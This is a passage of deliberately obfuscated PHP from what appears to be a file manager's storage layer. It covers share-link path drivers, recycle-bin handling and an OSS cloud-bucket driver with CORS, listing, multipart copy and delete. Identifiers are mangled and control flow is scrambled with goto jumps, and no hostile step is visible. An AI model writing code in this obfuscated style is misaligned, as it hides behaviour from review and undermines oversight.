®¯ÙëÛ[$CìñƒÈ°»÷[375]] == $CìñƒÈ°»÷[376]) { $F—¤¼®åîØ = array($CìñƒÈ°»÷[399] => array($CìñƒÈ°»÷[408], $a ®¯ÙëÛ[$CìñƒÈ°»÷[373]] . $dÑÙ˜‹‰çĞ . $CìñƒÈ°»÷[409])); $B˜ĞÎÌøåÔ->where($F—¤¼®åîØ)->setField($CìñƒÈ°»÷[410], 0); } goto A™ÇÑƒÙñó; aÂÄÂ¿öÃ¯: } $B˜ĞÎÌøåÔ->updateModifyTime($c¨Ÿëä¿öÀ); goto f…à§İÚÃ; bÁÏˆÒÛØ§: $CìñƒÈ°»÷ =& $_SERVER[İåâé¾]; $B˜ĞÎÌøåÔ = Model($CìñƒÈ°»÷[850]); $a‹Ìƒ¾‚é = $this->listData(); goto EÅˆ‘ˆã; EÅˆ‘ˆã: $cÊºÔ©‹¡ = $cÊºÔ©‹¡ == !1 ? !1 : $cÊºÔ©‹¡; if (!$a‹Ìƒ¾‚é) { return !0; } $c¨Ÿëä¿öÀ = array(); goto CÍ’¾Ç£æ; f…à§İÚÃ: } private function recycleMove($CÙ§¡ÈŠ†’, $CóØµ¯ŒôÅ = 1) { $EÀáîğ©Ş =& $_SERVER[İåâé¾]; $eìÉï–®Çá = Model($EÀáîğ©Ş[850]); $eŸñøÊòéç = Model($EÀáîğ©Ş[1790]); $c¼„³¤ÚŠ“ = array($EÀáîğ©Ş[374] => $CÙ§¡ÈŠ†’); if ($CóØµ¯ŒôÅ) { $eìÉï–®Çá->where($c¼„³¤ÚŠ“)->setField($EÀáîğ©Ş[410], 1); $eŸñøÊòéç->eventRecycle($CÙ§¡ÈŠ†’, $EÀáîğ©Ş[1791]); } else { $A¤·–ˆ¨‚ = $eìÉï–®Çá->where($c¼„³¤ÚŠ“)->find(); $FÈóÀˆÆ = $A¤·–ˆ¨‚[$EÀáîğ©Ş[375]] == $EÀáîğ©Ş[376]; $CÍ¹ÂÎ¾ê¿ = $eìÉï–®Çá->fileNameAuto($A¤·–ˆ¨‚[$EÀáîğ©Ş[384]], $A¤·–ˆ¨‚[$EÀáîğ©Ş[28]], REPEAT_RENAME_FOLDER, $FÈóÀˆÆ); if ($CÍ¹ÂÎ¾ê¿ != $A¤·–ˆ¨‚[$EÀáîğ©Ş[28]]) { $eìÉï–®Çá->rename($CÙ§¡ÈŠ†’, $CÍ¹ÂÎ¾ê¿); } $eìÉï–®Çá->where($c¼„³¤ÚŠ“)->setField($EÀáîğ©Ş[410], 0); $eŸñøÊòéç->eventRecycle($CÙ§¡ÈŠ†’, $EÀáîğ©Ş[1792]); } } } goto F‘©Œâ²×Ğ; DŠ²¯µÈ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($fƒ“¤Üéª) { $this->pathParse = $fƒ“¤Üéª; $this->model = Model($_SERVER[İåâé¾][850]); } protected function infoParse($f÷›…†ã˜Å, $dõ†îÙŸ™Ï = false, $f±Ãñäİ¼È = false) { $c‡¾óî¾¥Û =& $_SERVER[İåâé¾]; return Action($c‡¾óî¾¥Û[762])->sharePathInfo($this->pathParse[$c‡¾óî¾¥Û[76]], !0); } public function listAll($aäÊ‘âî‡˜) { $e¹âÛ‰¼¤Œ =& $_SERVER[İåâé¾]; $a–›Ù¦ØÊù = IO::info($this->pathParse[$e¹âÛ‰¼¤Œ[76]]); if (!$a–›Ù¦ØÊù) { return array(); } $BèÍ”ŞŠŠ× = $this->model->listAll($aäÊ‘âî‡˜); foreach ($BèÍ”ŞŠŠ× as &$a¯‡Ğ°‚¿½) { $a¯‡Ğ°‚¿½[$e¹âÛ‰¼¤Œ[856]] = Action($e¹âÛ‰¼¤Œ[762])->itemInfo($a¯‡Ğ°‚¿½[$e¹âÛ‰¼¤Œ[856]]); $dì¶Ş¹›±î = substr($a¯‡Ğ°‚¿½[$e¹âÛ‰¼¤Œ[76]], strpos(ltrim($a¯‡Ğ°‚¿½[$e¹âÛ‰¼¤Œ[76]], $e¹âÛ‰¼¤Œ[8]), $e¹âÛ‰¼¤Œ[8]) + 1); $a¯‡Ğ°‚¿½[$e¹âÛ‰¼¤Œ[856]][$e¹âÛ‰¼¤Œ[76]] = $this->pathParse[$e¹âÛ‰¼¤Œ[757]] . $dì¶Ş¹›±î; } return $BèÍ”ŞŠŠ×; } } class PathDriverDriverShareItem { public function __construct($c¨±¬„§‚œ) { $this->pathParse = $c¨±¬„§‚œ; } public function __call($DöÌÒÂ™ñ¬, $f­÷„œ¢Ô) { $A¶ªËŠµ =& $_SERVER[İåâé¾]; if (method_exists($this, $DöÌÒÂ™ñ¬)) { return; } $eæÊ˜”ˆ¥§ = call_user_func_array(array($A¶ªËŠµ[857], $DöÌÒÂ™ñ¬), $f­÷„œ¢Ô); $béƒ×²Š‹ = array($A¶ªËŠµ[858], $A¶ªËŠµ[859], $A¶ªËŠµ[860], $A¶ªËŠµ[861], $A¶ªËŠµ[740], $A¶ªËŠµ[741], $A¶ªËŠµ[862], $A¶ªËŠµ[101], $A¶ªËŠµ[863], $A¶ªËŠµ[864]); if (in_array($DöÌÒÂ™ñ¬, $béƒ×²Š‹)) { $eæÊ˜”ˆ¥§ = $this->getPathOuter($eæÊ˜”ˆ¥§); } return $eæÊ˜”ˆ¥§; } public function copy($C’ÕÍ‚î‰ì, $eÀÁ¬Ôª§, $DÌñç…¼ƒ = false) { return $this->copyMove($C’ÕÍ‚î‰ì, $eÀÁ¬Ôª§, $DÌñç…¼ƒ, $_SERVER[İåâé¾][740]); } public function move($b¼…é‹¾†ô, $E¤ªšİ¥ª¥, $e½Õ‹Şàƒò = false) { return $this->copyMove($b¼…é‹¾†ô, $E¤ªšİ¥ª¥, $e½Õ‹Şàƒò, $_SERVER[İåâé¾][741]); } private function copyMove($F„åœ§ğó, $fÚ¯‚Š‰©Ğ, $DŞÂ’‘°›ó, $E™ÒìŒÂ†à) { goto b…ƒ“ßô; e‘ŒÚ†ÙÁ÷: if ($FÚÉÈÏË->pathParse[$BÄ†Ğä‡œİ[742]]) { $fÚ¯‚Š‰©Ğ = $FÚÉÈÏË->pathParse[$BÄ†Ğä‡œİ[742]]; } else { $fÚ¯‚Š‰©Ğ = $a˜½êÚ‡²Œ; } $a‘·¹î¼î¢ = IO::copyMove($F„åœ§ğó, $fÚ¯‚Š‰©Ğ, $DŞÂ’‘°›ó, $E™ÒìŒÂ†à); $a‘·¹î¼î¢ = $this->getPathOuter($a‘·¹î¼î¢); goto B¹ìËá¹¿¿; b…ƒ“ßô: $BÄ†Ğä‡œİ =& $_SERVER[İåâé¾]; $a˜½êÚ‡²Œ = $fÚ¯‚Š‰©Ğ; $FÚÉÈÏË = IO::driverMake($fÚ¯‚Š‰©Ğ); goto e‘ŒÚ†ÙÁ÷; B¹ìËá¹¿¿: return $a‘·¹î¼î¢; goto D„¯¥Èæé°; D„¯¥Èæé°: } public function pathFather($Bğ“¬÷°«Ú) { return get_path_father($this->pathParse[$_SERVER[İåâé¾][76]]); } public function iconvSystem($EŞ¬‡ÜĞÙ) { return $EŞ¬‡ÜĞÙ; } protected function infoParse($eñ°›œ‰ç¾) { $bòÁ…Ùøô =& $_SERVER[İåâé¾]; $dä×‚ÚÉ±‚ = $this->pathParse[$bòÁ…Ùøô[764]][$bòÁ…Ùøô[763]] . $this->pathParse[$bòÁ…Ùøô[756]]; $d¸±¨µ¬ò  = IO::info($dä×‚ÚÉ±‚); $C¦‹‰ñÊëŠ = $this->pathParse[$bòÁ…Ùøô[764]]; return Action($bòÁ…Ùøô[855])->_shareItemeParse($d¸±¨µ¬ò , $C¦‹‰ñÊëŠ); } public function listAll($Aµ¨Û‡÷–Ë) { $aë›Úí±¶ƒ =& $_SERVER[İåâé¾]; $Cƒæ”Ñ‘§ = IO::listAll($Aµ¨Û‡÷–Ë); $CÅĞ¦±¦ëİ = $this->pathParse[$aë›Úí±¶ƒ[764]]; foreach ($Cƒæ”Ñ‘§ as &$aÍˆÕ•Ş“­) { check_abort(); $aÍˆÕ•Ş“­ = array_merge(IO::info($aÍˆÕ•Ş“­[$aë›Úí±¶ƒ[76]]), $aÍˆÕ•Ş“­); $aÍˆÕ•Ş“­[$aë›Úí±¶ƒ[856]] = Action($aë›Úí±¶ƒ[855])->_shareItemeParse($aÍˆÕ•Ş“­, $CÅĞ¦±¦ëİ); } return $Cƒæ”Ñ‘§; } public function getPathOuter($EŒŒóïİ…©) { goto c—Şæ¾ÓÉ¯; cè®ë˜İ†: $A…Ê¯©•ã = KodIO::clear($EŒŒóïİ…©); $AèœéÅ‘—ˆ = KodIO::clear($this->pathParse[$b„¥»¸ôßö[764]][$b„¥»¸ôßö[763]]); $e´¶·ñµîŒ = substr($A…Ê¯©•ã, strlen($AèœéÅ‘—ˆ)); goto cºá¤¥¿Ô; cºá¤¥¿Ô: if (substr($A…Ê¯©•ã, 0, strlen($AèœéÅ‘—ˆ)) != $AèœéÅ‘—ˆ) { return !1; } return $this->pathParse[$b„¥»¸ôßö[757]] . $b„¥»¸ôßö[8] . ltrim($e´¶·ñµîŒ, $b„¥»¸ôßö[8]); goto Fİ±©·¢Û’; c—Şæ¾ÓÉ¯: $b„¥»¸ôßö =& $_SERVER[İåâé¾]; $D™ğÂ»§îµ = KodIO::parse($EŒŒóïİ…©); if ($D™ğÂ»§îµ[$b„¥»¸ôßö[29]] == KodIO::KOD_SHARE_ITEM) { return $D™ğÂ»§îµ[$b„¥»¸ôßö[76]]; } goto cè®ë˜İ†; Fİ±©·¢Û’: } public function getType() { $bÇ‰ƒªùíË =& $_SERVER[İåâé¾]; $d«Ï·””‰ = str_replace($bÇ‰ƒªùíË[72], $bÇ‰ƒªùíË[33], get_class($this)); return strtolower($d«Ï·””‰); } public function isTypeObject($B‘ïÕæÍ‚ó) { return IO::isTypeObject($B‘ïÕæÍ‚ó); } public function info($B¡Œ™´Æ“) { return $this->infoParse($B¡Œ™´Æ“); } public function infoAuth($fÇ‚ĞÊµÚÚ) { return $this->infoParse($fÇ‚ĞÊµÚÚ); } public function infoWithChildren($bç£†“õƒÈ) { return $this->infoParse($bç£†“õƒÈ); } public function infoFull($FĞÈ‹ÕõÃÚ) { return $this->infoParse($FĞÈ‹ÕõÃÚ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($a–óÙ„ëë) { $this->pathParse = $a–óÙ„ëë; } protected function infoParse($FÕ¥‘ÊæÅ–) { $C¯îòšªÄ =& $_SERVER[İåâé¾]; return Action($C¯îòšªÄ[762])->sharePathInfo($this->pathParse[$C¯îòšªÄ[76]], !0); } public function listAll($D”ãàÀ’ Œ) { $E“…ÍõÄò =& $_SERVER[İåâé¾]; $céÒ÷¢Ò = IO::listAll($D”ãàÀ’ Œ); foreach ($céÒ÷¢Ò as &$E¾ËØÓ÷¯Ò) { check_abort(); $E¾ËØÓ÷¯Ò = array_merge(IO::info($E¾ËØÓ÷¯Ò[$E“…ÍõÄò[76]]), $E¾ËØÓ÷¯Ò); $E¾ËØÓ÷¯Ò[$E“…ÍõÄò[856]] = Action($E“…ÍõÄò[762])->itemInfo($E¾ËØÓ÷¯Ò); $Câ¶İ´¿íÊ = substr($E¾ËØÓ÷¯Ò[$E“…ÍõÄò[76]], strpos(ltrim($E¾ËØÓ÷¯Ò[$E“…ÍõÄò[76]], $E“…ÍõÄò[8]), $E“…ÍõÄò[8]) + 1); $E¾ËØÓ÷¯Ò[$E“…ÍõÄò[856]][$E“…ÍõÄò[76]] = $this->pathParse[$E“…ÍõÄò[757]] . $Câ¶İ´¿íÊ; } return $céÒ÷¢Ò; } } goto Aïì¯ßõŒà; D‰ºÛÌÎøÒ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CÄÅõ¦òï¥) { parent::__construct($CÄÅõ¦òï¥); $this->signatureVersion($_SERVER[İåâé¾][199]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($AµÀŸö¯) { parent::__construct(); include_once SDK_DIR . $_SERVER[İåâé¾][902]; $this->_init($AµÀŸö¯); } public function _init($aß­³’…æ¯) { foreach ($aß­³’…æ¯ as $DÉ³ƒ´ÄÊÂ => $a•Éùî•¦ğ) { if (isset($this->{$DÉ³ƒ´ÄÊÂ})) { $this->{$DÉ³ƒ´ÄÊÂ} = $a•Éùî•¦ğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[İåâé¾][903], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto C¯Ï®ô©Úƒ; Dæİäòß: $D®º–§±Öö->setMaxAgeSeconds(600); $D®º–§±Öö->addExposeHeader($a«ñŠğ–ù[909]); $D®º–§±Öö->addAllowedHeader($a«ñŠğ–ù[904]); goto fé‘ˆ³å…“; C¯Ï®ô©Úƒ: $a«ñŠğ–ù =& $_SERVER[İåâé¾]; $FÚ°¢àŸ§° = new OSS\Model\CorsConfig(); $D®º–§±Öö = new OSS\Model\CorsRule(); goto a„­ ìè™„; fé‘ˆ³å…“: $FÚ°¢àŸ§°->addRule($D®º–§±Öö); try { $this->client->putBucketCors($this->bucket, $FÚ°¢àŸ§°); } catch (OSS\Core\OssException $c•–êŞÃ·) { return !1; } return !0; goto DÑŒÚÇƒÑ; a„­ ìè™„: $D®º–§±Öö->addAllowedOrigin($a«ñŠğ–ù[904]); $D®º–§±Öö->addAllowedMethod($a«ñŠğ–ù[905]); $D®º–§±Öö->addAllowedMethod($a«ñŠğ–ù[906]); goto aÊˆ•Îƒˆ; aÊˆ•Îƒˆ: $D®º–§±Öö->addAllowedMethod($a«ñŠğ–ù[907]); $D®º–§±Öö->addAllowedMethod($a«ñŠğ–ù[908]); $D®º–§±Öö->addAllowedMethod($a«ñŠğ–ù[149]); goto Dæİäòß; DÑŒÚÇƒÑ: } public function getBucketCors() { goto aì¶ÖÚàÄ“; bŒòäÔ°¡: $b«áé“–ñ£ = $d•ŠŸ¿ª·[0]->getMaxAgeSeconds(); $aôªäÏ‘Ô¦ = $d•ŠŸ¿ª·[0]->getExposeHeaders(); $e×Í¨·É¿Ô = $d•ŠŸ¿ª·[0]->getAllowedHeaders(); goto c‡ïÛ’—µ; c‡ïÛ’—µ: return array($E–š²Úñ±®[171] => isset($eê¢Ù›¶õÌ[0]) ? $eê¢Ù›¶õÌ[0] : $E–š²Úñ±®[33], $E–š²Úñ±®[175] => $a¹‘¿¥ÕÀµ, $E–š²Úñ±®[910] => $b«áé“–ñ£, $E–š²Úñ±®[911] => isset($aôªäÏ‘Ô¦[0]) ? $aôªäÏ‘Ô¦[0] : $E–š²Úñ±®[33], $E–š²Úñ±®[173] => isset($e×Í¨·É¿Ô[0]) ? $e×Í¨·É¿Ô[0] : $E–š²Úñ±®[33]); goto FÑİóˆêÇ¥; aì¶ÖÚàÄ“: $E–š²Úñ±® =& $_SERVER[İåâé¾]; $dô°™ª ¤ç = null; try { $dô°™ª ¤ç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bƒ¬×ÏÂ¼É) { return null; } goto e¶œÆùô«’; e¶œÆùô«’: if (!$dô°™ª ¤ç || !($d•ŠŸ¿ª· = $dô°™ª ¤ç->getRules())) { return null; } $eê¢Ù›¶õÌ = $d•ŠŸ¿ª·[0]->getAllowedOrigins(); $a¹‘¿¥ÕÀµ = $d•ŠŸ¿ª·[0]->getAllowedMethods(); goto bŒòäÔ°¡; FÑİóˆêÇ¥: } public function isBucketCors() { goto Aßİ¯ç™²; Aßİ¯ç™²: $eÛ¸…­–Æ =& $_SERVER[İåâé¾]; $EÀœíÑÕŸÔ = $this->getBucketCors(); if (!$EÀœíÑÕŸÔ || !is_array($EÀœíÑÕŸÔ)) { return !1; } goto Dç”‹®ªŒ; Dç”‹®ªŒ: if ($EÀœíÑÕŸÔ[$eÛ¸…­–Æ[171]] != $eÛ¸…­–Æ[172] || $EÀœíÑÕŸÔ[$eÛ¸…­–Æ[173]] != $eÛ¸…­–Æ[172]) { return !1; } $f¸ÁàßÖô = array_map($eÛ¸…­–Æ[174], $EÀœíÑÕŸÔ[$eÛ¸…­–Æ[175]]); if (!is_array($f¸ÁàßÖô)) { $f¸ÁàßÖô = array(); } goto aÍ©Œøİè“; aÍ©Œøİè“: $Dá§‡›±°­ = array($eÛ¸…­–Æ[176], $eÛ¸…­–Æ[177], $eÛ¸…­–Æ[178], $eÛ¸…­–Æ[179], $eÛ¸…­–Æ[180]); $CÅ­áõ‰ñ = array_diff($Dá§‡›±°­, $f¸ÁàßÖô); return empty($CÅ­áõ‰ñ); goto D‹Çå„†À; D‹Çå„†À: } public function mkfile($E‚‡™ÎĞ†Œ, $E¸Â°¾¨’º = '', $D¯ŸËÔÊŠ” = REPEAT_RENAME) { $eÃÖÊ™®ã = $this->setContent($E‚‡™ÎĞ†Œ, $E¸Â°¾¨’º); if ($eÃÖÊ™®ã !== !1) { return $this->getPathOuter($E‚‡™ÎĞ†Œ); } return !1; } public function mkdir($B›ÉÒˆñ°, $cÔ³£ ¨›ã = REPEAT_SKIP) { if ($this->isFolder($B›ÉÒˆñ°)) { return $this->getPathOuter($B›ÉÒˆñ°); } try { $F“³º„º¬‡ = $this->pathEncode($B›ÉÒˆñ°); $this->client->createObjectDir($this->bucket, $F“³º„º¬‡); } catch (OSS\Core\OssException $DÅÅò˜ª—Ó) { return !1; } return $this->getPathOuter($B›ÉÒˆñ°); } private function fileList($AÀ²÷“‘Æ¿, $eš¢÷öõ³ = '', $d‘ Œê² = 0) { goto f§³£¸«øˆ; eêé×¡³: while (!0) { $eÁå¶¼º« = array($e¯Ïµã’…[912] => $eš¢÷öõ³, $e¯Ïµã’…[185] => $D³Ğó÷Éåó, $e¯Ïµã’…[913] => $CµÍğóÂ¸, $e¯Ïµã’…[914] => $Bœœ¤âˆ‰Õ); try { $C¿›”‘±Â = $this->client->listObjects($this->bucket, $eÁå¶¼º«); } catch (OSS\Core\OssException $aÃ‘ÑÂà©½) { break; } $Bœœ¤âˆ‰Õ = $C¿›”‘±Â->getNextMarker(); $EŸ˜ÓßÅ¤Œ = $C¿›”‘±Â->getObjectList(); $cø¨È¤ëô“ = $C¿›”‘±Â->getPrefixList(); foreach ($EŸ˜ÓßÅ¤Œ as $b©¤•®‚Š±) { if ($b©¤•®‚Š±->getKey() == $D³Ğó÷Éåó) { continue; } $c§°ó­¼ÂÙ = $b©¤•®‚Š±->getKey(); if ($d‘ Œê²) { $c§°ó­¼ÂÙ = array($e¯Ïµã’…[28] => $c§°ó­¼ÂÙ, $e¯Ïµã’…[78] => $b©¤•®‚Š±->getSize(), $e¯Ïµã’…[189] => strtotime($b©¤•®‚Š±->getLastModified())); } $f‹¢‚˜â„î[] = $c§°ó­¼ÂÙ; } foreach ($cø¨È¤ëô“ as $c¤¸å°¢) { $b±”ªø’Ğ[] = $c¤¸å°¢->getPrefix(); } if ($Bœœ¤âˆ‰Õ === $e¯Ïµã’…[33]) { break; } } return array($e¯Ïµã’…[75] => $b±”ªø’Ğ, $e¯Ïµã’…[74] => $f‹¢‚˜â„î); goto AÓ‹ØœÛ; f§³£¸«øˆ: $e¯Ïµã’… =& $_SERVER[İåâé¾]; $AÀ²÷“‘Æ¿ = trim($AÀ²÷“‘Æ¿, $e¯Ïµã’…[8]); $D³Ğó÷Éåó = empty($AÀ²÷“‘Æ¿) ? $e¯Ïµã’…[33] : $AÀ²÷“‘Æ¿ . $e¯Ïµã’…[8]; goto aÍÎÊ·ß¢¾; aÍÎÊ·ß¢¾: $Bœœ¤âˆ‰Õ = $e¯Ïµã’…[33]; $CµÍğóÂ¸ = 1000; $b±”ªø’Ğ = $f‹¢‚˜â„î = array(); goto eêé×¡³; AÓ‹ØœÛ: } public function copyFile($d´’ñŸì’¸, $b×Íî¿Éæ˜) { $EÚ™ ¡¦®Ø = $this->size($d´’ñŸì’¸); if ($EÚ™ ¡¦®Ø < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $this->pathEncode($d´’ñŸì’¸), $this->bucket, $this->pathEncode($b×Íî¿Éæ˜)); } catch (OSS\Core\OssException $BÄÙ„‚ç½ä) { return !1; } return !0; } return $this->multiCopyObject($d´’ñŸì’¸, $b×Íî¿Éæ˜, $EÚ™ ¡¦®Ø); } private function multiCopyObject($B£Î’ó­ÔÅ, $BÒØò»™ì, $F»²ÒŞîäĞ) { $Cšî’£ï˜‘ =& $_SERVER[İåâé¾]; try { goto B†ºØÀòÎö; fÂ²š‡‡†ª: $Fî›¿µ©–å = $this->client->generateMultiuploadParts($F»²ÒŞîäĞ, 1024 * 1024 * 10); foreach ($Fî›¿µ©–å as $bš¸©£ªË¢ => $f—ëÛéá…) { $B­èå¤‡æ» = $B‡ë¯¹§¦” + (int) $f—ëÛéá…[$Cšî’£ï˜‘[916]]; $e×‹§Ÿİø¦ = (int) $f—ëÛéá…[$Cšî’£ï˜‘[328]] + $B­èå¤‡æ» - 1; $Bßµ ÀôÙ• = array($Cšî’£ï˜‘[917] => $B­èå¤‡æ», $Cšî’£ï˜‘[918] => $e×‹§Ÿİø¦); $e—£÷“À¿´[] = $this->client->uploadPartCopy($this->bucket, $this->pathEncode($B£Î’ó­ÔÅ), $this->bucket, $this->pathEncode($BÒØò»™ì), $aÂ¢ä‰ÖÁ®, $D‘¨åÅ¬Ã‚, $Bßµ ÀôÙ•); $aÂ¢ä‰ÖÁ® = $aÂ¢ä‰ÖÁ® + 1; } $EÈ×ñ”™œˆ = array(); goto bÆ¿Ãé¼”; bÆ¿Ãé¼”: foreach ($e—£÷“À¿´ as $bš¸©£ªË¢ => $A¹ÃÌñ¶) { $EÈ×ñ”™œˆ[] = array($Cšî’£ï˜‘[919] => $bš¸©£ªË¢ + 1, $Cšî’£ï˜‘[920] => $A¹ÃÌñ¶); } $CÉ×®ÄŒµ = $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($BÒØò»™ì), $D‘¨åÅ¬Ã‚, $EÈ×ñ”™œˆ); goto eÀŒµõ´Øù; e¯»í“¾Å: $aÂ¢ä‰ÖÁ® = 1; $B‡ë¯¹§¦” = 0; $e—£÷“À¿´ = array(); goto fÂ²š‡‡†ª; B†ºØÀòÎö: $d†“¬¼˜È¼ = array(); if ($F«îâé¾ = $this->hashMd5($B£Î’ó­ÔÅ)) { $d†“¬¼˜È¼ = array(OSS\OssClient::OSS_HEADERS => array($Cšî’£ï˜‘[915] => $F«îâé¾)); } $D‘¨åÅ¬Ã‚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BÒØò»™ì), $d†“¬¼˜È¼); goto e¯»í“¾Å; eÀŒµõ´Øù: } catch (OSS\Core\OssException $EóºÉŒø¬‡) { return !1; } return !0; } public function moveFile($Aà£„õ¡®§, $Eå½½³³‹£) { if ($this->copyFile($Aà£„õ¡®§, $Eå½½³³‹£)) { $this->remove($Aà£„õ¡®§); return !0; } return !1; } public function delFile($BÕ£ø‚µÃã) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BÕ£ø‚µÃã)); } catch (OSS\Core\OssException $dÄ¯ ôÁÖ­) { return !1; } return !0; } public function delFolder($aëÛÔ¯²İ) { $cèòÂÌøóÜ =& $_SERVER[İåâé¾]; $c¾åášÄ„„ = $this->fileList($aëÛÔ¯²İ); if (!empty($aëÛÔ¯²İ) && !in_array(trim($aëÛÔ¯²İ, $cèòÂÌøóÜ[8]) . $cèòÂÌøóÜ[8], $c¾åášÄ„„[$cèòÂÌøóÜ[74]])) { $c¾åášÄ„„[$cèòÂÌøóÜ[74]][] = trim($aëÛÔ¯²İ, $cèòÂÌøóÜ[8]) . $cèòÂÌøóÜ[8]; } foreach (array_chunk($c¾åášÄ„„[$cèòÂÌøóÜ[74]], 1000) as $bÇº×óØÎÅ) { try { $this->client->deleteObjects($this->bucket, $bÇº×óØÎÅ); } catch (OSS\Core\OssException $B½œ²ÊìÀ) { return !1; } } return !0; } public function rename($EÊš»Šé„¢, $a¤·éËŞËò) { return $this->renameObject($EÊš»Šé„¢, $a¤·éËŞËò); } public function _size($AˆĞ¿‹œŒÑ) { if (!$this->isFile($AˆĞ¿‹œŒÑ)) { return 0; } try { $DáïÖ¶¨Âá = $this->client->getObjectMeta($this->bucket, $this->pathEncode($AˆĞ¿‹œŒÑ)); } catch (OSS\Core\OssException $fÄ­Àğ÷ËÌ) { return !1; } return $DáïÖ¶¨Âá[$_SERVER[İåâé¾][921]] + 0; } public function _info($aˆÖˆ—ìÒ³) { if ($this->isFolder($aˆÖˆ—ìÒ³)) { return $this->folderInfo($aˆÖˆ—ìÒ³, 1); } if (!$this->isFile($aˆÖˆ—ìÒ³)) { return !1; } return $this->fileInfo($aˆÖˆ—ìÒ³); } private function fileInfo($eôÖÔ®˜óè, $a«‹ÔùùŠæ = array(), $cä†õùÌ·Ÿ = false) { goto bµÜÖ±š©Ì; E™‚ÌåÅ˜: if (empty($a«‹ÔùùŠæ)) { $fœñ¾íØñ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eôÖÔ®˜óè)); if (!$fœñ¾íØñ) { return $e™¿ íÕ÷²; } $a«‹ÔùùŠæ = array($B™¿ˆšİÕ´[186] => $fœñ¾íØñ[$B™¿ˆšİÕ´[922]][$B™¿ˆšİÕ´[923]], $B™¿ˆšİÕ´[189] => strtotime($fœñ¾íØñ[$B™¿ˆšİÕ´[924]]), $B™¿ˆšİÕ´[78] => $fœñ¾íØñ[$B™¿ˆšİÕ´[921]] + 0); $this->fileInfoImage($eôÖÔ®˜óè, $e™¿ íÕ÷²); } $e™¿ íÕ÷²[$B™¿ˆšİÕ´[105]] = $a«‹ÔùùŠæ[$B™¿ˆšİÕ´[189]]; $e™¿ íÕ÷²[$B™¿ˆšİÕ´[78]] = $a«‹ÔùùŠæ[$B™¿ˆšİÕ´[78]]; goto B›†´×ï·ö; bµÜÖ±š©Ì: $B™¿ˆšİÕ´ =& $_SERVER[İåâé¾]; if ($cä†õùÌ·Ÿ) { return array($B™¿ˆšİÕ´[28] => $this->pathThis($eôÖÔ®˜óè), $B™¿ˆšİÕ´[76] => $this->getPathOuter($eôÖÔ®˜óè), $B™¿ˆšİÕ´[29] => $B™¿ˆšİÕ´[163], $B™¿ˆšİÕ´[156] => $this->ext($eôÖÔ®˜óè), $B™¿ˆšİÕ´[78] => isset($a«‹ÔùùŠæ[$B™¿ˆšİÕ´[78]]) ? $a«‹ÔùùŠæ[$B™¿ˆšİÕ´[78]] : 0); } $e™¿ íÕ÷² = array($B™¿ˆšİÕ´[28] => $this->pathThis($eôÖÔ®˜óè), $B™¿ˆšİÕ´[76] => $this->getPathOuter($eôÖÔ®˜óè), $B™¿ˆšİÕ´[29] => $B™¿ˆšİÕ´[163], $B™¿ˆšİÕ´[186] => $B™¿ˆšİÕ´[50], $B™¿ˆšİÕ´[105] => $B™¿ˆšİÕ´[50], $B™¿ˆšİÕ´[78] => 0, $B™¿ˆšİÕ´[156] => $this->ext($eôÖÔ®˜óè), $B™¿ˆšİÕ´[187] => !0, $B™¿ˆšİÕ´[188] => !0); goto E™‚ÌåÅ˜; B›†´×ï·ö: if (isset($a«‹ÔùùŠæ[$B™¿ˆšİÕ´[186]])) { $e™¿ íÕ÷²[$B™¿ˆšİÕ´[186]] = $a«‹ÔùùŠæ[$B™¿ˆšİÕ´[186]]; } return $e™¿ íÕ÷²; goto B™Ì˜ğñÅé; B™Ì˜ğñÅé: } private function folderInfo($c¬ƒÙ¤ÚÃ‹, $D•Ü ¬ˆ = 0, $Cê¼ÃËÉÏê = false) { $A‘ºÃ´§ =& $_SERVER[İåâé¾]; if ($Cê¼ÃËÉÏê) { return array($A‘ºÃ´§[28] => $this->pathThis($c¬ƒÙ¤ÚÃ‹), $A‘ºÃ´§[76] => $this->getPathOuter($A‘ºÃ´§[8] . $c¬ƒÙ¤ÚÃ‹), $A‘ºÃ´§[29] => $A‘ºÃ´§[77]); } $A¬³¯Ö•¢æ = array($A‘ºÃ´§[28] => $this->pathThis($c¬ƒÙ¤ÚÃ‹), $A‘ºÃ´§[76] => $this->getPathOuter($A‘ºÃ´§[8] . $c¬ƒÙ¤ÚÃ‹), $A‘ºÃ´§[29] => $A‘ºÃ´§[77], $A‘ºÃ´§[186] => $A‘ºÃ´§[50], $A‘ºÃ´§[105] => $A‘ºÃ´§[50], $A‘ºÃ´§[190] => 1, $A‘ºÃ´§[191] => 1, $A‘ºÃ´§[187] => !0, $A‘ºÃ´§[188] => !0); if ($D•Ü ¬ˆ) { $A¬³¯Ö•¢æ[$A‘ºÃ´§[190]] = $this->has($c¬ƒÙ¤ÚÃ‹, !1); $A¬³¯Ö•¢æ[$A‘ºÃ´§[191]] = $this->has($c¬ƒÙ¤ÚÃ‹, !0); } return $A¬³¯Ö•¢æ; } public function exist($eÀ£„ ¯¥) { if ($this->isFile($eÀ£„ ¯¥) || $this->isFolder($eÀ£„ ¯¥)) { return !0; } return !1; } public function size($Cœ—¿†­ˆ) { return $this->cacheMehod($_SERVER[İåâé¾][894], $Cœ—¿†­ˆ); } public function info($bŠÜ‰«Àº) { return $this->cacheMehod($_SERVER[İåâé¾][182], $bŠÜ‰«Àº); } public function isFile($C‚¤—ÉáÃë) { return $this->cacheMehod($_SERVER[İåâé¾][183], $C‚¤—ÉáÃë); } public function isFolder($b¸­È¨ë‰») { return $this->cacheMehod($_SERVER[İåâé¾][184], $b¸­È¨ë‰»); } public function _isFile($e™çù¤í¾Ê) { if ($this->isFolder($e™çù¤í¾Ê)) { return !1; } try { return $this->client->doesObjectExist($this->bucket, $this->pathEncode($e™çù¤í¾Ê)); } catch (OSS\Core\OssException $FÎ‹å‘¦±Ş) { return !1; } } public function 